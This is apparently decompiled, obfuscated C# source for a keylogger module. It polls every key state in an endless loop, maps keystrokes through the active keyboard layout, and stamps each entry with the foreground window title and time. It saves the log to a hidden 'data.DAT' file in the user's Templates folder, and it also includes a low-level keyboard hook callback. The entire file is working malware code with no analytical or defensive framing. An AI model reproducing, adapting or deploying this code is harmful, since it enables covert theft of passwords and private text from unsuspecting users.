using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns2;

namespace ns0;

internal class Class2
{
	private struct Struct0
	{
		public uint uint_0;

		public uint uint_1;

		public Enum0 enum0_0;

		public uint uint_2;

		public UIntPtr uintptr_0;
	}

	private enum Enum0 : uint
	{
		const_0 = 1u,
		const_1 = 0x10u,
		const_2 = 0x20u,
		const_3 = 0x80u
	}

	private delegate int Delegate9(int nCode, IntPtr wParam, IntPtr lParam);

	public string string_0;

	public bool bool_0;

	public int int_0;

	public string string_1;

	private bool bool_1;

	private bool[] bool_2;

	private int int_1;

	private string string_2;

	private Keys keys_0;

	private Delegate9 delegate9_0;

	private IntPtr intptr_0;

	public Class2()
	{
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		string_0 = "";
		bool_0 = false;
		int_0 = 10240000;
		string_1 = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\data.DAT";
		bool_1 = false;
		bool_2 = new bool[256];
		keys_0 = (Keys)0;
		delegate9_0 = method_4;
		intptr_0 = IntPtr.Zero;
	}

	public void method_0()
	{
		//IL_0037: Unknown result type (might be due to invalid IL or missing references)
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string_0 = File.ReadAllText(string_1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		checked
		{
			try
			{
				int num = 0;
				while (true)
				{
					num++;
					int num2 = 0;
					do
					{
						if (GetAsyncKeyState(num2) == -32767)
						{
							Keys keys_ = (Keys)num2;
							string text = method_1(keys_);
							if (text.Length > 0)
							{
								string_0 += method_2();
								string_0 += text;
							}
							keys_0 = keys_;
						}
						num2++;
					}
					while (num2 <= 255);
					if (num == 1000)
					{
						num = 0;
						int num3 = 20480;
						if (string_0.Length > 20480)
						{
							string_0 = string_0.Remove(0, string_0.Length - num3);
						}
						File.WriteAllText(string_1, string_0);
					}
					Thread.Sleep(1);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto)]
	private static extern int CallNextHookEx(int int_2, int int_3, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(IntPtr intptr_1, ref int int_2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetForegroundWindow();

	private string method_1(Keys keys_1)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Invalid comparison between Unknown and I4
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Invalid comparison between Unknown and I4
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Invalid comparison between Unknown and I4
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Invalid comparison between Unknown and I4
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Invalid comparison between Unknown and I4
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Invalid comparison between Unknown and I4
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Invalid comparison between Unknown and I4
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Invalid comparison between Unknown and I4
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Invalid comparison between Unknown and I4
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Invalid comparison between Unknown and I4
		//IL_008c: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Invalid comparison between Unknown and I4
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Invalid comparison between Unknown and I4
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_009e: Invalid comparison between Unknown and I4
		//IL_00a5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Invalid comparison between Unknown and I4
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Invalid comparison between Unknown and I4
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Invalid comparison between Unknown and I4
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Invalid comparison between Unknown and I4
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Invalid comparison between Unknown and I4
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Invalid comparison between Unknown and I4
		//IL_00e1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Invalid comparison between Unknown and I4
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Invalid comparison between Unknown and I4
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Invalid comparison between Unknown and I4
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0104: Invalid comparison between Unknown and I4
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Invalid comparison between Unknown and I4
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Invalid comparison between Unknown and I4
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0120: Invalid comparison between Unknown and I4
		//IL_0123: Unknown result type (might be due to invalid IL or missing references)
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_0144: Unknown result type (might be due to invalid IL or missing references)
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0164: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0184: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c9: Expected I4, but got Unknown
		//IL_01de: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected I4, but got Unknown
		bool flag = ((Computer)Class7.smethod_0()).get_Keyboard().get_ShiftKeyDown();
		if (((Computer)Class7.smethod_0()).get_Keyboard().get_CapsLock())
		{
			flag = ((!flag) ? true : false);
		}
		try
		{
			if ((int)keys_1 != 112 && (int)keys_1 != 113 && (int)keys_1 != 114 && (int)keys_1 != 115 && (int)keys_1 != 116 && (int)keys_1 != 117 && (int)keys_1 != 118 && (int)keys_1 != 119 && (int)keys_1 != 120 && (int)keys_1 != 121 && (int)keys_1 != 122 && (int)keys_1 != 123 && (int)keys_1 != 35 && (int)keys_1 != 46 && (int)keys_1 != 8)
			{
				if ((int)keys_1 != 160 && (int)keys_1 != 161 && (int)keys_1 != 65536 && (int)keys_1 != 16 && (int)keys_1 != 131072 && (int)keys_1 != 17 && (int)keys_1 != 163 && (int)keys_1 != 162 && (int)keys_1 != 262144)
				{
					if ((int)keys_1 == 32)
					{
						return "[Space]";
					}
					if ((int)keys_1 != 13 && (int)keys_1 != 13)
					{
						if ((int)keys_1 == 9)
						{
							if (keys_0 == keys_1)
							{
								return "";
							}
							return "[TAP]\r\n";
						}
						checked
						{
							if (flag)
							{
								return smethod_0((uint)keys_1).ToUpper();
							}
							return smethod_0((uint)keys_1);
						}
					}
					if (keys_0 == keys_1)
					{
						return "";
					}
					return "[ENTER]\r\n";
				}
				return "[" + ((Enum)keys_1).ToString() + "]";
			}
			return "[" + ((Enum)keys_1).ToString() + "]";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result;
			if (flag)
			{
				result = Strings.ChrW((int)keys_1).ToString().ToUpper();
				ProjectData.ClearProjectError();
				return result;
			}
			result = Strings.ChrW((int)keys_1).ToString().ToLower();
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_0(uint uint_0)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			byte[] byte_ = new byte[255];
			if (!GetKeyboardState(byte_))
			{
				return "";
			}
			uint uint_ = MapVirtualKey(uint_0, 0u);
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = 0;
			int windowThreadProcessId = GetWindowThreadProcessId(foregroundWindow, ref int_);
			IntPtr intptr_ = (IntPtr)GetKeyboardLayout(windowThreadProcessId);
			ToUnicodeEx(uint_0, uint_, byte_, stringBuilder, 5, 0u, intptr_);
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return ((Enum)(Keys)checked((int)uint_0)).ToString();
	}

	private string method_2()
	{
		try
		{
			IntPtr foregroundWindow = GetForegroundWindow();
			int int_ = default(int);
			GetWindowThreadProcessId(foregroundWindow, ref int_);
			Process processById = Process.GetProcessById(int_);
			if ((foregroundWindow.ToInt32() == int_1) & (Operators.CompareString(string_2, processById.MainWindowTitle, false) == 0))
			{
				return "";
			}
			int_1 = foregroundWindow.ToInt32();
			string_2 = processById.MainWindowTitle;
			return "\r\n\r\n#| [" + string_2 + "]" + method_3() + " |#\r\n";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private string method_3()
	{
		DateTime localTime = ((ServerComputer)Class7.smethod_0()).get_Clock().get_LocalTime();
		return " [ " + Conversions.ToString(localTime.Day) + "/" + Conversions.ToString(localTime.Month) + "/" + Conversions.ToString(localTime.Year) + " - " + Conversions.ToString(localTime.Hour) + ":" + Conversions.ToString(localTime.Minute) + ":" + Conversions.ToString(localTime.Second) + " ]";
	}

	[DllImport("user32")]
	private static extern int ToUnicodeEx(uint uint_0, uint uint_1, byte[] byte_0, [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder stringBuilder_0, int int_2, uint uint_2, IntPtr intptr_1);

	[DllImport("user32")]
	private static extern bool GetKeyboardState(byte[] byte_0);

	[DllImport("user32")]
	private static extern uint MapVirtualKey(uint uint_0, uint uint_1);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetKeyboardLayout(int int_2);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern short GetAsyncKeyState(int int_2);

	private int method_4(int int_2, IntPtr intptr_1, IntPtr intptr_2)
	{
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		checked
		{
			if (int_2 == 0)
			{
				Struct0 @struct = default(Struct0);
				Struct0 struct2 = default(Struct0);
				if (!(intptr_1 == (IntPtr)256) && !(intptr_1 == (IntPtr)260))
				{
					if (intptr_1 == (IntPtr)257 || intptr_1 == (IntPtr)261)
					{
						object? obj = Marshal.PtrToStructure(intptr_2, @struct.GetType());
						Keys val = (Keys)(int)((obj != null) ? ((Struct0)obj) : struct2).uint_0;
						bool_2[val] = false;
					}
				}
				else
				{
					object? obj2 = Marshal.PtrToStructure(intptr_2, @struct.GetType());
					Keys val2 = (Keys)(int)((obj2 != null) ? ((Struct0)obj2) : struct2).uint_0;
					bool_2[val2] = true;
				}
			}
			return CallNextHookEx((int)IntPtr.Zero, int_2, intptr_1, intptr_2);
		}
	}
}
